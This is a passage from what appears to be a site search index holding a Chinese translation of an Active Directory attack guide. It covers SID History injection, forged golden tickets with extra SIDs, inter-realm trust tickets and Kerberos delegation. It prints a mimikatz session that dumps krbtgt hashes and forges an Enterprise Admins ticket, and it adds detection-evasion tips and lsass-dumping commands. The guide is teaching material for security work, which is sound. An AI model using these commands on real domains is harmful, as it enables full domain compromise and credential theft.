Admins\u201d(RID=512)\u8fd9\u6837\u7684\u3001RID\u5c0f\u4e8e1000\u7684\u7ec4\u5c06\u8e22\u51fa\u7ba1\u7406\u7ec4\uff0c\u4f46\u662fRID\u8f83\u9ad8\u7684\u7ec4\u4ecd\u5212\u5f52\u7ba1\u7406\u7ec4\uff08\u6216\u6210\u4e3a\u7ba1\u7406\u7ec4\uff09\uff0c\u5982Exchange\u7ba1\u7406\u7ec4\u3002</p> <p>\u7136\u540e\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u7f16\u8f91SID\u5386\u53f2\u8bb0\u5f55\uff0c\u6765\u6ce8\u5165\u5176\u4ed6\u57df\u7684\u7ba1\u7406\u6743\u9650\u3002\u4f8b\u5982\uff0c\u5982\u679c\u5c06Enterprise Admins SID\u63d2\u5165\u5230\u7528\u6237SID\u5386\u53f2\u8bb0\u5f55\u4e2d\uff0c\u5219\u8be5\u7528\u6237\u53ef\u4ee5\u5728\u6574\u4e2a\u6797\u4e2d\u62e5\u6709\u7ba1\u7406\u6743\u9650\u3002</p> <p>\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528mimikatz misc::addsid\u547d\u4ee4\u5728Active Directory\u6570\u636e\u5e93\u4e2d\u76f4\u63a5\u7f16\u8f91SID History\u5c5e\u6027\u3002</p> <p>\u4f46\u662f\uff0c\u6b63\u5982\u6211\u4eec\u524d\u9762\u6240\u8bf4\u7684\uff0c\u7531\u4e8eSID History\u5c5e\u6027\u4f1a\u88ab\u590d\u5236\u5230TGT\u7684PAC\u4e2d\uff0c\u6240\u4ee5\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u91d1\u7968\uff0c\u5c31\u80fd\u5c06\u6240\u9700\u7684\u5386\u53f2SID\u76f4\u63a5\u6ce8\u5165\u5230PAC\u989d\u5916\u7684SID\u5c5e\u6027\u4e2d\u3002\u7136\u540e\uff0c\u5f53\u6211\u4eec\u4f7f\u7528\u8fd9\u4e2a\u201cGolder\u201d\u7968\u8bc1\u65f6\uff0c\u5b83\u7684PAC\u5c06\u88ab\u590d\u5236\u5230\u57df\u95f4TGT\u4e2d\u3002\u4e4b\u540e\uff0c\u5f53\u4f7f\u7528\u8be5\u57df\u95f4TGT\u4e3a\u5916\u90e8\u57df\u4e2d\u7684\u670d\u52a1\u83b7\u53d6ST\u65f6\uff0c\u5982\u679c\u8fd9\u4e9b\u57df\u4f4d\u4e8e\u540c\u4e00\u6797\u4e2d\uff0c\u5219\u7279\u6743SID\u5c31\u53ef\u4ee5\u590d\u5236\u5230ST PAC\u4e2d\uff0c\u4ece\u800c\u6388\u4e88\u6211\u4eec\u6700\u521d\u5728\u91d1\u7968\u4e2d\u6ce8\u5165\u7684\u7279\u6743\u3002</p> <p>\u653b\u51fb\u8005\u7ecf\u5e38\u63d2\u5165\u7684SID\u662f\u201cEnterprise Admins\u201d\u7684SID\uff0c\u8be5\u7ec4\u53ea\u5b58\u5728\u4e8e\u6797\u4e2d\u7684\u6839\u57df\u4e2d\uff0c\u5e76\u4e14\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f5c\u4e3a\u6797\u4e2d\u6240\u6709\u57df\u7684\u6240\u6709\u201cdomain Admins\u201d\u7ec4\u7684\u6210\u5458\u6dfb\u52a0\u3002</p> <p>\u5b9e\u9645\u4e0a\uff0c\u5982\u679c\u60a8\u7834\u574f\u4e86\u57df\u7684\u6839\u76ee\u5f55\u6797\uff0c\u5e76\u521b\u5efa\u4e86\u4e00\u4e2a\u5305\u542b\u201cEnterprise Admins\u201d\u7ec4\u7684\u91d1\u7968(RID\u4e3a519\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0bimpacket\u548cmimikatz\u4f1a\u5305\u542b\u8be5\u7ec4\uff09\uff0c\u90a3\u4e48\u60a8\u5c31\u65e0\u9700\u521b\u5efa\u5e26\u6709\u989d\u5916SID\u7684\u91d1\u7968\u4e86\uff0c\u56e0\u4e3a\u60a8\u5df2\u7ecf\u62e5\u6709\u63a7\u5236\u6240\u6709\u76ee\u5f55\u6797\u7684\u6743\u9650\uff0c\u751a\u81f3\u5305\u62ec\u9694\u79bb\u57df\uff08\u56e0\u4e3a\u6ca1\u6709\u989d\u5916\u7684SID\u8981\u7b5b\u9009\uff09\u3002\u53ea\u6709\u5f53\u60a8\u7834\u574f\u4e00\u4e2a\u975e\u6839\u57df\u5e76\u5e0c\u671b\u5165\u4fb5\u6797\u4e2d\u7684\u53e6\u4e00\u4e2a\u57df\uff08\u8fc7\u6ee4\u989d\u5916SID\u7684\u9694\u79bb\u57df\u9664\u5916\uff09\u65f6\uff0c\u624d\u9700\u8981\u5c06\u201cEnterprise Admins\u201d\u7ec4\u6dfb\u52a0\u5230\u989d\u5916SID\u4e2d\u3002</p> <p><code>PS C:\\&gt; .\\mimikatz.exe    .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29  .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)  ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  ## \\ / ##       &gt; https://blog.gentilkiwi.com/mimikatz  '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )   '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/  mimikatz # sekurlsa::krbtgt  Current krbtgt: 5 credentials          * rc4_hmac_nt       : 1bf960a6af7703f75b1a2b04787c85fb          * rc4_hmac_old      : 1bf960a6af7703f75b1a2b04787c85fb          * rc4_md4           : 1bf960a6af7703f75b1a2b04787c85fb          * aes256_hmac       : 8603210037f738c50120dbe0f2259466fd4fdd1d58ec0cf9ace34eb990c705a3          * aes128_hmac       : 204be93d3c18326bf0e6675eb0a32202  mimikatz # kerberos::golden /admin:Administrator /domain:it.poke.mon /sid:S-1-5-21-1913835218-2813970975-3434927454 /sids:S-1-5-21-4285720809-372211516-2297741651-519 /aes256:8603210037f738c50120dbe0f2259466fd4fdd1d58ec0cf9ace34eb990c705a3 /ptt /groups:512,520,572 User      : Administrator Domain    : it.poke.mon (IT) SID       : S-1-5-21-1913835218-2813970975-3434927454 User Id   : 500 Groups Id : *512 520 572 Extra SIDs: S-1-5-21-4285720809-372211516-2297741651-519 ; ServiceKey: 8603210037f738c50120dbe0f2259466fd4fdd1d58ec0cf9ace34eb990c705a3 - aes256_hmac Lifetime  : 5/13/2021 9:36:28 AM ; 5/11/2031 9:36:28 AM ; 5/11/2031 9:36:28 AM -&gt; Ticket : ** Pass The Ticket **   * PAC generated  * PAC signed  * EncTicketPart generated  * EncTicketPart encrypted  * KrbCred generated  Golden ticket for 'Administrator @ it.poke.mon' successfully submitted for current session</code></p> <p>\u5229\u7528\u989d\u5916SID\u4e2d\u7684Enterprise Admins\u53d1\u52a8Pass-The-Ticket\u653b\u51fb</p> <p>\u7136\u800c\uff0c\u8981\u5728\u5176\u4ed6\u57df\u4e2d\u6267\u884cdcsync\u653b\u51fb\uff0c\u4f7f\u7528\u201cEnterprise Domain Controllers\u201d(S-1-5-9)\u548c\u201cDomain Controllers\u201d(S-1-5-21-domain-516)\u7ec4\u7684SID\u80fd\u591f\u8fbe\u5230\u66f4\u9690\u853d\u7684\u6548\u679c\uff0c\u56e0\u4e3aDC\u901a\u5e38\u4f1a\u6267\u884cdcsync\u4e2d\u7684\u540c\u6b65\u89c4\u5219\u3002</p> <p>\u8981\u521b\u5efa\u201cGolder\u201d\u7968\u8bc1\uff0c\u53ef\u4ee5\u4f7f\u7528mimikatz kerberos::golden\u547d\u4ee4\u6216impacket ticketer.py\u811a\u672c\uff0c\u8fd9\u4e00\u70b9\u4e0e\u91d1\u7968\u7684\u521b\u5efa\u8fc7\u7a0b\u7c7b\u4f3c\uff0c\u4f46\u9700\u8981\u6dfb\u52a0\u989d\u5916\u7684SID\u3002\u5982\u679c\u53ef\u4ee5\uff0c\u8bf7\u4f7f\u7528AES256\u5bc6\u94a5\u4ee5\u907f\u514d\u88abATA\u7b49\u5b89\u5168\u89e3\u51b3\u65b9\u6848\u68c0\u6d4b\u5230\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#inter-realm-tgt","title":"Inter-realm TGT","text":"<p>\u6b63\u5982\u6211\u4eec\u6240\u770b\u5230\u7684\uff0c\u5c06Kerberos\u7528\u4e8e\u57df\u95f4\u64cd\u4f5c\u5f15\u5165\u4e86\u4e00\u79cd\u65b0\u7684TGT\uff0c\u5373\u57df\u95f4TGT\u3002\u8fd9\u79cdTGT\u4e0e\u666e\u901aTGT\u5b8c\u5168\u76f8\u540c\uff0c\u53ea\u662f\u4f7f\u7528\u57df\u95f4\u4fe1\u4efb\u5bc6\u94a5\u8fdb\u884c\u4e86\u52a0\u5bc6\uff0c\u800c\u57df\u95f4\u4fe1\u4efb\u5bc6\u94a5\u662f\u4e00\u79cd\u5141\u8bb8\u4fe1\u4efb\u53cc\u65b9\u4e92\u76f8\u8fdb\u884c\u901a\u4fe1\u7684\u5bc6\u94a5\u3002\u8be5\u5bc6\u94a5\u5b58\u50a8\u4e3a\u8868\u793a\u4fe1\u4efb\u5173\u7cfb\u7684\u7528\u6237\u5e10\u6237\u7684\u5bc6\u94a5\u3002</p> <p>\u4e3a\u4e86\u83b7\u5f97\u57df\u95f4\u4fe1\u4efb\u5bc6\u94a5\uff0c\u901a\u5e38\u9700\u8981\u8f6c\u50a8\u57df\u6570\u636e\u5e93\u3002\u6b64\u5916\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u8fd8\u53ef\u4ee5\u901a\u8fc7Kerberoast\u83b7\u5f97\u4fe1\u4efb\u5bc6\u94a5\u3002</p> <p>\u5f53\u521b\u5efa\u4fe1\u4efb\u5173\u7cfb\u65f6\uff0c\u5bc6\u7801\u53ef\u4ee5\u7531\u4e2a\u4eba\u8fdb\u884c\u9009\u62e9\uff0c\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6e\u5f31\u5bc6\u7801\u3002\u7136\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbe\u6cd5\u83b7\u5f97\u4e00\u4e2a\u7528\u4fe1\u4efb\u5bc6\u94a5\u52a0\u5bc6\u7684\u57df\u95f4TGT\uff0c\u7136\u540e\u7834\u89e3\u5b83\uff0c\u4ee5\u83b7\u5f97\u4fe1\u4efb\u5bc6\u7801\uff08\u7528\u4e8e\u751f\u6210\u6240\u6709Kerberos\u4fe1\u4efb\u7684\u5bc6\u94a5\uff09\u3002\u4f46\u8bf7\u8bb0\u4f4f\uff0c\u4fe1\u4efb\u5bc6\u7801\u548c\u673a\u5668\u5bc6\u7801\u901a\u5e38\u6bcf30\u5929\u5c31\u4f1a\u66f4\u6362\u4e00\u6b21\u3002</p> <p>\u6700\u540e\uff0c\u4e00\u65e6\u83b7\u5f97\u4fe1\u4efb\u5bc6\u94a5\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528mimikatz kerberos::golden\u547d\u4ee4\u6216impacket ticketer.py\u811a\u672c\u521b\u5efa\u57df\u95f4\u7968\u8bc1\u3002\u8fd9\u6837\uff0c\u5c31\u53ef\u4ee5\u628a\u5b83\u4f5c\u4e3a\u4efb\u4f55\u7968\u8bc1\u4f7f\u7528\u3002\u4fe1\u4efb\u95f4\u7968\u8bc1\uff08inter-trust tickets\uff09\u662f\u7528RC4\u5bc6\u94a5\u52a0\u5bc6\u7684\uff0c\u5373\u4fe1\u4efb\u5e10\u6237\u7684NT\u54c8\u5e0c\u503c\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#kerberos-delegation","title":"Kerberos Delegation","text":"<p>\u6b63\u5982\u6211\u4eec\u6240\u770b\u5230\u7684\uff0cKerberos\u5141\u8bb8\u7528\u6237\u5728\u6574\u4e2a\u57df\uff0c\u751a\u81f3\u5728\u5176\u4ed6\u57df\u4e2d\u5bf9\u670d\u52a1\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u548c\u8bbf\u95ee\u3002\u7136\u800c\uff0c\u6709\u65f6\u88ab\u8bbf\u95ee\u7684\u670d\u52a1\u9700\u8981\u201c\u5192\u5145\u201d\u7528\u6237\u7684\u8eab\u4efd\uff0c\u4ee5\u4fbf\u4e0e\u7b2c\u4e09\u65b9\u670d\u52a1\u8fdb\u884c\u5bf9\u8bdd\u3002</p> <p>\u4f8b\u5982\uff0c\u7528\u6237\u767b\u5f55\u7684Web\u670d\u52a1\u5668\uff08\u4f7f\u7528Kerberos\uff09\u9700\u8981\u4ee5\u7528\u6237\u7684\u8eab\u4efd\u5728\u6570\u636e\u5e93\u4e2d\u6267\u884c\u4e00\u4e9b\u6d3b\u52a8\u3002\u7136\u800c\uff0c\u5f53\u7528\u6237\u5bf9\u7f51\u7edc\u670d\u52a1\u5668\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u65f6\uff0c\u5b83\u53ea\u4f1a\u4e3a\u81ea\u5df1\u63a5\u6536\u7528\u6237ST\uff0c\u4f46\u4e3a\u4e86\u5192\u5145\u7528\u6237\uff0c\u5b83\u8fd8\u9700\u8981\u6570\u636e\u5e93\u670d\u52a1\u7684\u7528\u6237ST\u3002</p> <p>\u8981\u5904\u7406\u8fd9\u79cd\u60c5\u51b5\uff0c\u53ef\u4ee5\u4f7f\u7528Kerberos\u59d4\u6d3e\u3002\u8be5\u7279\u6027\u63d0\u4f9b\u4e86\u5141\u8bb8\u670d\u52a1\u4ee3\u8868\u5ba2\u6237\u7aef\u4e3a\u7b2c\u4e09\u4e2a\u670d\u52a1\u83b7\u5f97ST\u7684\u673a\u5236\u3002</p> <p>\u8981\u5728Active Directory\u4e2d\u6267\u884cKerberos\u59d4\u6d3e\uff0c\u6709\u4e24\u79cd\u65b9\u6cd5\uff1a * * \u65e0\u7ea6\u675f\u59d4\u6d3e * \u8fd9\u610f\u5473\u7740\u4f1a\u5c06ST\u5185\u7684\u7528\u6237TGT\u53d1\u9001\u7ed9\u670d\u52a1\uff0c\u5141\u8bb8\u5b83\u901a\u8fc7\u4f7f\u7528\u5ba2\u6237\u7aefTGT\u6765\u5168\u9762\u201c\u5192\u5145\u201dKDC\u4e2d\u7684\u5ba2\u6237\u7aef\u3002 * \u7ea6\u675f\u59d4\u6d3e * \u8fd9\u610f\u5473\u7740\u4f1a\u63d0\u4f9b\u76f8\u5173\u673a\u5236\uff0c\u5373\u7528\u6237\u670d\u52a1(S4U)\u6269\u5c55\uff0c\u5141\u8bb8\u670d\u52a1\u201c\u5192\u5145\u201d\u7528\u6237\u8bf7\u6c42ST\u800c\u4e0d\u9700\u8981\u63d0\u4f9b\u5ba2\u6237\u7aefTGT\uff0c\u5e76\u4e14\u53ea\u9488\u5bf9\u67d0\u4e9b\u88ab\u8bb8\u53ef\u7684\u670d\u52a1\u3002</p> <p>\u4e0b\u9762\uff0c\u8ba9\u6211\u4eec\u8003\u5bdfKerberos\u59d4\u6d3e\u662f\u5982\u4f55\u5de5\u4f5c\u7684\u3002\u4e3a\u6b64\uff0c\u8ba9\u6211\u4eec\u5148\u56de\u987e\u4e00\u4e0b\u963b\u6b62\u59d4\u6d3e\u7684\u53cd\u59d4\u6d3e\u63aa\u65bd\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#kerberos-anti-delegation-measures","title":"Kerberos Anti Delegation Measures","text":"<p>\u6709\u4e24\u79cd\u673a\u5236\u53ef\u7528\u4e8e\u907f\u514d\u59d4\u6d3e\uff08\u5728Kerberos\u4e2d\u5192\u5145\uff09\u7279\u5b9a\u7528\u6237\u5e10\u6237\uff1a</p> <p><code>\u5728\u7528\u6237\u5e10\u6237\u7684UserAccountControl\u5c5e\u6027\u4e2d\u8bbe\u7f6eNOT_DELEGATED\u6807\u5fd7\u3002 \u5c06\u7528\u6237\u6dfb\u52a0\u5230\u201c\u53d7\u4fdd\u62a4\u7528\u6237\u201d\u7ec4\u3002</code></p> <p>\u5728\u5bf9\u7528\u6237\u5e10\u6237\u5e94\u7528\u4efb\u4f55\u7c7b\u4f3c\u63aa\u65bd\u65f6\uff0c\u5c06\u65e0\u6cd5\u8fdb\u884c\u59d4\u6d3e\u3002\u56e0\u6b64\uff0c\u4e86\u89e3\u54ea\u4e9b\u662f\u53d7\u4fdd\u62a4\u7684\u5e10\u6237\u662f\u975e\u5e38\u91cd\u8981\u7684\uff0c\u8981\u627e\u5230\u8fd9\u4e9b\u5e10\u6237\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u5177\u6709\u4ee5\u4e0b\u7b5b\u9009\u5668\u7684LDAP\u67e5\u8be2\uff1a</p> <p><code>(|   (memberof:1.2.840.113556.1.4.1941:=CN=Protected Users,CN=Users,DC=&lt;domain&gt;,DC=&lt;dom&gt;)   (userAccountControl:1.2.840.113556.1.4.803:=1048576) )</code></p> <p>\u68c0\u7d22\u53d7\u59d4\u6d3e\u4fdd\u62a4\u7684\u5e10\u6237\u7684LDAP\u7b5b\u9009\u5668</p> <p>\u8981\u67e5\u627e\u53d7\u59d4\u6d3e\u4fdd\u62a4\u7684\u5e10\u6237\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528Powerview\u3001Powershell activedirectory\u6a21\u5757\u6216ldapsearch\u7b49\u5de5\u5177\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#kerberos-unconstrained-delegation","title":"Kerberos Unconstrained Delegation","text":"<p>\u5728Kerberos\u65e0\u7ea6\u675f\u59d4\u6d3e\u4e2d\uff0c\u670d\u52a1\u53ef\u4ee5\u6a21\u62df\u5ba2\u6237\u7aef\u7528\u6237\uff0c\u56e0\u4e3a\u8fd9\u4f1a\u5c06\u81ea\u5df1\u7684TGT\u53d1\u9001\u5230\u670d\u52a1\u3002\u7136\u540e\uff0c\u670d\u52a1\u53ef\u4ee5\u4f7f\u7528\u7528\u6237TGT\uff08\u6ca1\u6709\u4efb\u4f55\u7ea6\u675f\uff09\u6765\u5192\u5145\u5ba2\u6237\u7aef\u4e3a\u5176\u4ed6\u670d\u52a1\u8bf7\u6c42\u65b0\u7684ST\u3002</p> <p>KDC\u5c06\u5728ST\u4e2d\u4e3a\u5176\u6240\u6709\u8005\uff08\u670d\u52a1\u7528\u6237\uff09\u8bbe\u7f6e\u4e86UserAccountControl TRUSTED_FOR_\u6807\u5fd7\u7684\u4efb\u4f55\u670d\u52a1\u8bbe\u7f6eOK-AS-DELEGATE\u6807\u5fd7\u3002\u901a\u8fc7\u68c0\u67e5OK-AS-DELEGATE\u548cFORWARDABLE\u6807\u5fd7\uff0c\u5ba2\u6237\u7aef\u5c31\u80fd\u77e5\u9053\u5b83\u662f\u5426\u5e94\u8be5\u8bf7\u6c42\u5c06TGT\u53d1\u9001\u5230\u76ee\u6807\u670d\u52a1\uff0c\u4ee5\u4fbf\u5141\u8bb8\u4e0d\u53d7\u7ea6\u675f\u7684\u59d4\u6d3e\u3002</p> <p>\u5982\u679c\u5ba2\u6237\u7aef\u662f\u53d7\u4fdd\u62a4\u7528\u6237\u7ec4\u7684\u6210\u5458\u6216\u8bbe\u7f6e\u4e86UserAccountControl NOT_DELEGATED\u6807\u5fd7\uff0c\u5219\u5728ST\u4e2d\u53d6\u6d88\u8bbe\u7f6eFORWARDABLE\u6807\u5fd7\u3002</p> <p>\u6b64\u5916\uff0c\u8981\u5728\u7528\u6237\u5e10\u6237\u4e2d\u8bbe\u7f6eTRUSTED_FOR_\u6807\u5fd7\uff0c\u5219\u9700\u8981SeEnableDelegationPrivilege\u6743\u9650\u3002</p> <p>\u8ba9\u6211\u4eec\u770b\u4e00\u4e2a\u5177\u4f53\u7684\u793a\u4f8b\uff1a</p> <pre><code>                                `KDC (DC)  .-----------1) TGS-REQ-------------&gt; .---. &lt;--------6) TGS-REQ-------------.  |         + SPN: HTTP/websrv        /   /|     + SPN: MSSQLSvc/dbsrv       |  |         + TGT client             .---. |     + TGT client - FORWARDED    |  |                                  |   | '                                 |  |  .--------2) TGS-REP-----------&lt; |   |/ &gt;--------7) TGS-REP-----------.  |  |  |  + ST client &gt; HTTP/websrv    '---'   + ST client &gt; MSSQLSvc/dbsrv |  |  |  |    - OK-AS-DELEGATE           ^   v                                |  |  |  |    - FORWARDABLE              |   |                                |  |  ^  v                               |   |                                |  |   _____                             |   |                                |  |  |     | &gt;-----3) TGS-REP-----------'   |                                |  |  |_____|  + SPN: krbtgt/domain.local    |                                |  |  /:::::/  + TGT client                  |                                |  |  ------                                 |                                |  |  client  &lt;-----4) TGS-REP---------------'                                |  |    v        + TGT client - FORWARDED                                     v  ^    |                                                                    .---.    |                                                                   /   /|    |                                                                  .---. |    '----------------------------5) AP-REQ---------------------------&gt; |   | '                           + ST client &gt; HTTP\\websrv                   |   |/                           + TGT client - FORWARDED                    '---'                                                                       websrv                                                                        v                                   .---.                                |                                  /   /|                                |                                 .---. | &lt;--------8) AP-REQ-------------'                                 |   | '   + ST client &gt; MSSQLSvc\\dbsrv                                 |   |/                                 '---'                                 dbsrv`\n</code></pre> <p>\u65e0\u7ea6\u675f\u59d4\u6d3e</p> <p><code>\u5ba2\u6237\u7aef\u901a\u8fc7\u4f7f\u7528\u5176TGT\uff0c\u4e3aHTTP\\websrv\u670d\u52a1\uff08websrv\u670d\u52a1\u5668\u4e2d\u7684\u4e00\u4e2a\u7f51\u7edc\u670d\u52a1\uff09\u8bf7\u6c42\u4e00\u4e2aST\u3002HTTP\\websrv\u670d\u52a1\u5c5e\u4e8e\u7528\u6237websrv$\uff08\u8bb0\u4f4f\uff0c[[#computer-accounts][computer accounts]]\u683c\u5f0f\u7684\u7528\u6237\u540d\u4ee5=$=\u7ed3\u5c3e\uff09\u3002 KDC\u4f1a\u68c0\u67e5\u662f\u5426\u4e3awebsrv$\u7528\u6237\u8bbe\u7f6e\u4e86TRUSTED_FOR_DELEGATION\u6807\u5fd7\u3002\u5982\u679c\u5df2\u7ecf\u8bbe\u7f6e\u7684\u8bdd\uff0cKDC\u5c06\u5411\u5ba2\u6237\u7aef\u8fd4\u56de\u4e00\u4e2aHTTP\\websrv\u7684ST\uff0c\u8be5ST\u5df2\u7ecf\u8bbe\u7f6e\u4e86OK-AS-DELEGATE\u6807\u5fd7\uff08\u548cFORWARDABLE\u6807\u5fd7\uff09\u3002 \u5ba2\u6237\u7aef\u68c0\u67e5OK-AS-DELEGATE\u6807\u5fd7\uff0c\u53d1\u73b0\u8be5\u670d\u52a1\u4f7f\u7528\u4e86\u59d4\u6d3e\uff0c\u6240\u4ee5\uff0c\u5b83\u51b3\u5b9a\u5411KDC\u7d22\u8981\u53d1\u9001\u7ed9\u8be5\u670d\u52a1\u7684FORWARDED TGT\u3002 KDC\u8fd4\u56de\u4e00\u4e2a\u5e26\u6709FORWARDED\u6807\u5fd7\u7684TGT\u3002 \u5ba2\u6237\u7aef\u5411websrv\u53d1\u9001\u5305\u542bFORWARDED TGT\u7684ST\uff0c\u4ee5\u83b7\u5f97\u5bf9HTTP/websrv\u670d\u52a1\u7684\u8bbf\u95ee\u6743\u9650\u3002 \u6709\u65f6\uff0cHTTP\\websrv\u9700\u8981\u5192\u5145\u5ba2\u6237\u7aef\u6765\u8bbf\u95ee\u4f4d\u4e8edbsrv\u7684\u6570\u636e\u5e93\u670d\u52a1\u3002\u56e0\u6b64\uff0cWeb\u670d\u52a1\u5c06\u4f7f\u7528\u6536\u5230\u7684\u5ba2\u6237\u7aefTGT\uff0c\u4ee5\u5ba2\u6237\u8eab\u4efd\u4e3aMSSQLSvc\\dbsrv\u8bf7\u6c42\u4e00\u4e2aST\u3002 \u7136\u540e\uff0cKDC\u4e3a\u5ba2\u6237\u7aef\u8fd4\u56de\u4e00\u4e2aST\uff0c\u4f7f\u5176\u80fd\u591f\u8bbf\u95eeMSSQLSvc\\dbsrv\u670d\u52a1\u3002 \u6700\u540e\uff0cHTTP\\websrv\u670d\u52a1\u901a\u8fc7\u5192\u5145\u5ba2\u6237\u7aef\u4f7f\u7528ST\u6765\u8bbf\u95eeMSSQLSvc\\dbsrv\u3002</code></p> <p>\u6700\u91cd\u8981\u7684\u4e8b\u5b9e\u53ef\u80fd\u662f\uff0c\u4efb\u4f55\u53d1\u9001\u5230HTTP\\websrv\u7684ST\u5c06\u5305\u542b\u4e00\u4e2a\u6765\u81ea\u5ba2\u6237\u7aef\u7684TGT\u3002\u56e0\u6b64\uff0c\u5982\u679c\u6709\u4eba\u5165\u4fb5\u4e86websrv\u670d\u52a1\u5668\uff0c\u5c31\u80fd\u591f\u5f97\u5230\u6240\u6709\u8fd9\u4e9bTGT\uff0c\u5e76\u901a\u8fc7Pass the Ticket\u653b\u51fb\u4f7f\u7528\u5b83\u4eec\u6765\u5192\u5145\u4efb\u4f55\u5ba2\u6237\u3002</p> <p>\u8981\u4ece\u4e00\u53f0Windows\u673a\u5668\u4e0a\u68c0\u7d22\u7968\u8bc1\uff08\u5305\u62ec\u59d4\u6d3e\u7684TGT\uff09\uff0c\u53ef\u4ee5\u4f7f\u7528mimikatz sekurlsa::tasks\u547d\u4ee4\u6216Rubeus dump\u547d\u4ee4\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u7528procdump\u3001sqldumper\u6216\u5176\u4ed6\u5de5\u5177\u6765\u8f6c\u50a8lsass\u8fdb\u7a0b\uff0c\u7136\u540e\u7528mimikatz\u6216pypykatz\u79bb\u7ebf\u63d0\u53d6\u7968\u8bc1\u3002</p> <p>\u4f46\u8bf7\u8bb0\u4f4f\uff0c\u5bf9\u4e8e\u8bbe\u7f6e\u4e86UserAccountControl TRUSTED_FOR_DELEGATION\u6807\u5fd7\u7684\u8d26\u6237\u7684\u670d\u52a1\u6765\u8bf4\uff0cTGT\u5c06\u5305\u542b\u5728\u6240\u6709ST\u4e2d\u3002\u56e0\u6b64\uff0c\u5728\u524d\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u7531\u4e8ewebsrv$\u8ba1\u7b97\u673a\u8d26\u6237\u662fHTTP\\websrv\u670d\u52a1\u7684\u6240\u6709\u8005\uff0c\u56e0\u6b64\uff0c\u4e3awebsrv$\u7684\u4efb\u4f55\u5176\u4ed6\u670d\u52a1\u8bf7\u6c42\u7684\u4efb\u4f55ST\uff0c\u4f8b\u5982CIFS\\websrv\uff08\u53ef\u4ee5\u7528\u6765\u8bbf\u95eeSMB\u5171\u4eab\uff09\uff0c\u4e5f\u5c06\u5305\u542b\u5ba2\u6237\u7aefTGT\u3002</p> <p>\u4e3a\u4e86\u8bc6\u522b\u65e0\u7ea6\u675f\u59d4\u6d3e\u8d26\u6237\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684LDAP\u8fc7\u6ee4\u5668\uff1a</p> <p><code>(UserAccountControl:1.2.840.113556.1.4.803:=524288)</code></p> <p>\u4e3a\u4e86\u67e5\u627e\u65e0\u7ea6\u675f\u59d4\u6d3e\u5e10\u6237\uff0c\u53ef\u4ee5\u4f7f\u7528Powerview\u3001impacket findDelegation.py\u811a\u672c\u3001Powershell ActiveDirectory\u6a21\u5757\u6216LDAPSearch\u7b49\u5de5\u5177\u3002</p> <p>\u56e0\u6b64\uff0c\u5982\u679c\u60a8\u5165\u4fb5\u4e86\u4e00\u4e2a\u670d\u52a1\u5668\uff0c\u5e76\u4e14\u5176\u5e10\u6237\u5177\u6709\u65e0\u7ea6\u675f\u59d4\u6d3e\uff0c\u90a3\u4e48\uff0c\u60a8\u53ef\u4ee5\u83b7\u5f97\u8fde\u63a5\u5230\u5b83\u7684\u6240\u6709\u5ba2\u6237\u7aef\u7684TGT\u3002\u540c\u65f6\uff0c\u60a8\u8fd8\u53ef\u4ee5\u4f7f\u7528\u5404\u79cd\u9493\u9c7c\u6280\u672f\u6765\u8bf1\u9a97\u7528\u6237\u8fde\u63a5\u5230\u60a8\u7684\u670d\u52a1\u5668\uff0c\u4f8b\u5982\u5229\u7528\u8bf1\u9975\u6587\u4ef6\u6084\u6084\u8fde\u63a5\u81f3\u5df2\u7ecf\u88ab\u5165\u4fb5\u7684\u8ba1\u7b97\u673a\uff0c\u4ece\u800c\u83b7\u53d6Kerberos TGT\u3002</p> <p>\u6b64\u5916\uff0c\u60a8\u53ef\u4ee5\u901a\u8fc7\u5f3a\u5236\u8ba1\u7b97\u673a\u5e10\u6237\u8fde\u63a5\u5230\u542b\u6709\u6253\u5370\u673a\u5b89\u5168\u6f0f\u6d1e\u7684\u670d\u52a1\u5668\u6765\u83b7\u5f97\u8be5\u5e10\u6237\u7684TGT\u3002\u4e4b\u540e\uff0c\u8bbe\u6cd5\u8ba9\u6253\u5370\u673a\u4f7f\u7528RPRN 